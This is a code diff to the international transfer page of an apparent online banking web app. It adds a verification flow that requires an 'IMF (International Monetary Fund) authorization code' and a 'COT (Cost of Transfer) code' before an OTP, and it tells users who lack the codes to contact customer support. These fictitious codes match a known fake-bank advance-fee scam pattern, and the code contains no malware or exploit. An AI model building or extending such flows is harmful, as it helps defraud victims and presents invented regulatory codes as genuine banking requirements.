@@ -29,7 +29,12 @@ import {
   Loader2,
   MoreHorizontal,
   Bitcoin,
+  KeyRound,
+  Mail,
+  AlertCircle,
 } from 'lucide-react';
+
+type VerificationStep = 'form' | 'imf' | 'cot' | 'otp' | 'complete';
 
 type TransferMethod = 
   | 'wire'
@@ -89,6 +94,12 @@ export default function InternationalTransferPage() {
   const [showPin, setShowPin] = useState(false);
   const [showPreview, setShowPreview] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  
+  // Multi-step verification state
+  const [currentStep, setCurrentStep] = useState<VerificationStep>('form');
+  const [transferId, setTransferId] = useState<string>('');
+  const [verificationCode, setVerificationCode] = useState('');
+  const [otpSent, setOtpSent] = useState(false);
 
   // Form data
   const [amount, setAmount] = useState('');
@@ -317,25 +328,16 @@ export default function InternationalTransferPage() {
       const data = await response.json();
 
       if (!response.ok) {
-        // API returns error in 'error' field, not 'message'
         const apiError = data.error || data.message || 'Transfer failed';
         const detailedError = getDetailedErrorMessage(apiError, response.status);
         throw new Error(detailedError);
       }
 
+      // Store transfer ID and proceed to verification steps
+      setTransferId(data.data._id);
       setShowPreview(false);
-      
-      toast.success(
-        <div>
-          <p className="font-semibold">Transfer Initiated Successfully!</p>
-          <p className="text-sm mt-1">Your {getMethodTitle()} of {currencySymbol}{parseFloat(amount).toLocaleString()} is being processed.</p>
-        </div>,
-        { duration: 5000 }
-      );
-      
-      setTimeout(() => {
-        router.push('/dashboard/transactions');
-      }, 2000);
+      setCurrentStep('imf');
+      toast.success('Transfer initiated. Please complete verification to proceed.');
       
     } catch (err) {
       setShowPreview(false);
@@ -348,6 +350,74 @@ export default function InternationalTransferPage() {
         </div>,
         { duration: 8000 }
       );
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  // Handle verification code submission
+  const handleVerifyCode = async (step: 'imf' | 'cot' | 'otp') => {
+    if (!verificationCode) {
+      toast.error('Please enter the verification code');
+      return;
+    }
+    
+    setIsSubmitting(true);
+    try {
+      const token = localStorage.getItem('token');
+      const response = await fetch('/api/user/transfers/verify', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`,
+        },
+        body: JSON.stringify({ transferId, step, code: verificationCode }),
+      });
+
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Verification failed');
+
+      setVerificationCode('');
+      
+      if (data.data.nextStep === 'cot') {
+        setCurrentStep('cot');
+        toast.success('IMF Code verified successfully');
+      } else if (data.data.nextStep === 'otp') {
+        setCurrentStep('otp');
+        toast.success('COT Code verified successfully');
+      } else if (data.data.nextStep === 'complete') {
+        setCurrentStep('complete');
+        toast.success('Transfer completed successfully!');
+        setTimeout(() => router.push('/dashboard/transactions'), 3000);
+      }
+    } catch (err) {
+      toast.error(err instanceof Error ? err.message : 'Verification failed');
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  // Handle OTP sending
+  const handleSendOtp = async () => {
+    setIsSubmitting(true);
+    try {
+      const token = localStorage.getItem('token');
+      const response = await fetch('/api/user/transfers/send-otp', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`,
+        },
+        body: JSON.stringify({ transferId }),
+      });
+
+      const data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Failed to send OTP');
+
+      setOtpSent(true);
+      toast.success(data.data.message || 'OTP sent to your email');
+    } catch (err) {
+      toast.error(err instanceof Error ? err.message : 'Failed to send OTP');
     } finally {
       setIsSubmitting(false);
     }
@@ -722,6 +792,213 @@ export default function InternationalTransferPage() {
         return null;
     }
   };
+
+  // Render verification step UI
+  const renderVerificationStep = () => {
+    const stepConfig = {
+      imf: { 
+        title: 'IMF Code Verification', 
+        desc: 'Enter your IMF (International Monetary Fund) authorization code to proceed with this international transfer.',
+        icon: KeyRound,
+        placeholder: 'Enter your IMF Code',
+      },
+      cot: { 
+        title: 'COT Code Verification', 
+        desc: 'Enter your COT (Cost of Transfer) authorization code to continue.',
+        icon: Shield,
+        placeholder: 'Enter your COT Code',
+      },
+      otp: { 
+        title: 'OTP Verification', 
+        desc: 'Enter the One-Time Password sent to your registered email address.',
+        icon: Mail,
+        placeholder: 'Enter 6-digit OTP',
+      },
+      complete: { 
+        title: 'Transfer Complete', 
+        desc: 'Your international transfer has been successfully processed.',
+        icon: CheckCircle,
+        placeholder: '',
+      },
+    };
+
+    const config = stepConfig[currentStep as keyof typeof stepConfig];
+    if (!config) return null;
+
+    const IconComponent = config.icon;
+
+    return (
+      <div className="max-w-lg mx-auto">
+        <div className="rounded-xl overflow-hidden" style={{ backgroundColor: 'rgb(31 41 55)' }}>
+          {/* Header */}
+          <div className="px-6 py-8 text-center" style={{ background: 'linear-gradient(135deg, #0369a1 0%, #0284c7 50%, #020617 100%)' }}>
+            <div className="mx-auto w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mb-4">
+              <IconComponent className="h-8 w-8 text-white" />
+            </div>
+            <h2 className="text-xl font-bold text-white">{config.title}</h2>
+            <p className="text-white/80 mt-2 text-sm">{config.desc}</p>
+          </div>
+
+          {/* Progress Steps */}
+          <div className="px-6 py-4 border-b border-gray-700">
+            <div className="flex items-center justify-between">
+              {['imf', 'cot', 'otp', 'complete'].map((step, index) => (
+                <div key={step} className="flex items-center">
+                  <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium ${
+                    currentStep === step ? 'bg-cyan-500 text-white' :
+                    ['imf', 'cot', 'otp', 'complete'].indexOf(currentStep) > index ? 'bg-green-500 text-white' :
+                    'bg-gray-700 text-gray-400'
+                  }`}>
+                    {['imf', 'cot', 'otp', 'complete'].indexOf(currentStep) > index ? '✓' : index + 1}
+                  </div>
+                  {index < 3 && <div className={`w-12 h-1 mx-1 ${
+                    ['imf', 'cot', 'otp', 'complete'].indexOf(currentStep) > index ? 'bg-green-500' : 'bg-gray-700'
+                  }`} />}
+                </div>
+              ))}
+            </div>
+            <div className="flex justify-between mt-2 text-xs text-gray-400">
+              <span>IMF</span>
+              <span>COT</span>
+              <span>OTP</span>
+              <span>Done</span>
+            </div>
+          </div>
+
+          {/* Content */}
+          <div className="p-6">
+            {currentStep === 'complete' ? (
+              <div className="text-center py-8">
+                <div className="mx-auto w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mb-4">
+                  <CheckCircle className="h-10 w-10 text-green-400" />
+                </div>
+                <h3 className="text-lg font-semibold text-white mb-2">Transfer Successful!</h3>
+                <p className="text-gray-400 mb-4">Your transfer of {currencySymbol}{formatCurrency(amountValue)} is being processed.</p>
+                <p className="text-sm text-gray-500">Redirecting to transactions...</p>
+              </div>
+            ) : currentStep === 'otp' && !otpSent ? (
+              <div className="text-center py-4">
+                <p className="text-gray-400 mb-6">Click the button below to receive your One-Time Password via email.</p>
+                <button
+                  onClick={handleSendOtp}
+                  disabled={isSubmitting}
+                  className="inline-flex items-center px-6 py-3 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 disabled:opacity-50"
+                >
+                  {isSubmitting ? (
+                    <><Loader2 className="h-5 w-5 mr-2 animate-spin" /> Sending...</>
+                  ) : (
+                    <><Mail className="h-5 w-5 mr-2" /> Send OTP to Email</>
+                  )}
+                </button>
+              </div>
+            ) : (
+              <div>
+                <div className="mb-6">
+                  <label className="block text-sm font-medium text-white mb-2">Verification Code</label>
+                  <input
+                    type="text"
+                    value={verificationCode}
+                    onChange={(e) => setVerificationCode(e.target.value)}
+                    className="block w-full px-4 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                    placeholder={config.placeholder}
+                    maxLength={currentStep === 'otp' ? 6 : 20}
+                  />
+                </div>
+
+                <button
+                  onClick={() => handleVerifyCode(currentStep as 'imf' | 'cot' | 'otp')}
+                  disabled={isSubmitting || !verificationCode}
+                  className="w-full inline-flex items-center justify-center px-6 py-3 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 disabled:opacity-50"
+                >
+                  {isSubmitting ? (
+                    <><Loader2 className="h-5 w-5 mr-2 animate-spin" /> Verifying...</>
+                  ) : (
+                    <><CheckCircle className="h-5 w-5 mr-2" /> Verify & Continue</>
+                  )}
+                </button>
+
+                {currentStep === 'otp' && (
+                  <button
+                    onClick={handleSendOtp}
+                    disabled={isSubmitting}
+                    className="w-full mt-3 text-sm text-cyan-400 hover:text-cyan-300"
+                  >
+                    Resend OTP
+                  </button>
+                )}
+              </div>
+            )}
+
+            {/* Warning Notice */}
+            {currentStep !== 'complete' && (
+              <div className="mt-6 p-4 bg-amber-500/10 border border-amber-500/30 rounded-lg">
+                <div className="flex items-start">
+                  <AlertTriangle className="h-5 w-5 text-amber-400 shrink-0 mt-0.5" />
+                  <div className="ml-3">
+                    <p className="text-sm text-amber-200">
+                      If you don&apos;t have your verification codes, please contact customer support for assistance.
+                    </p>
+                  </div>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* Back Button */}
+        {currentStep !== 'complete' && (
+          <button
+            onClick={() => {
+              setCurrentStep('form');
+              setTransferId('');
+              setVerificationCode('');
+              setOtpSent(false);
+            }}
+            className="mt-4 inline-flex items-center text-gray-400 hover:text-white"
+          >
+            <ArrowLeft className="h-4 w-4 mr-2" /> Cancel Transfer
+          </button>
+        )}
+      </div>
+    );
+  };
+
+  // Check if account is active
+  const userStatus = user?.status || 'active';
+  if (userStatus !== 'active') {
+    return (
+      <div className="max-w-2xl mx-auto">
+        <div className="rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
+          <div className="mx-auto w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
+            <AlertCircle className="h-8 w-8 text-red-400" />
+          </div>
+          <h2 className="text-xl font-bold text-white mb-2">Account Inactive</h2>
+          <p className="text-gray-400 mb-6">Your account is currently inactive. Please contact support to reactivate your account before making international transfers.</p>
+          <Link href="/dashboard/support" className="inline-flex items-center px-6 py-3 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700">
+            Contact Support
+          </Link>
+        </div>
+      </div>
+    );
+  }
+
+  // Show verification steps if not on form
+  if (currentStep !== 'form') {
+    return (
+      <div>
+        {/* Page Header */}
+        <div className="flex flex-col mb-6">
+          <h1 className="text-2xl font-bold text-white mb-1" style={{color: "white"}}>Transfer Verification</h1>
+          <div className="flex items-center text-sm text-gray-400">
+            <Link href="/dashboard" className="hover:text-cyan-400 transition-colors" style={{color: "white"}}>Dashboard</Link>
+            <ChevronRight className="h-4 w-4 mx-2" />
+            <span className="text-white">Verification</span>
+          </div>
+        </div>
+        {renderVerificationStep()}
+      </div>
+    );
+  }
 
   return (
     <div>
